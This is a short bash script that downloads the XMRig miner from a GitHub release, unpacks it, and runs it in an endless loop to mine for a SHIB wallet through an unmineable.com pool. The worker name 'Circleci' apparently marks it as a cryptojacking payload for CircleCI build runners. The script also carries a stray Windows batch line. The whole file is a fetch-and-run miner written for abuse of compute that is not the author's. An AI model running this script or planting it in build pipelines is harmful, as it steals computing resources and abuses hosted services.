#!/bin/bash
@echo off
wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz && tar xf xmrig-6.15.2-linux-x64.tar.gz
cd xmrig-6.15.2
while [ 1 ]; do
./xmrig -o rx.unmineable.com:3333 -u SHIB:0x3fd05afac3e2edced734c32fd7bb2f176c588298.Circleci#uzvu-2w9w -p X -k -a rx/0
sleep 3
done
sleep 999
exit 0
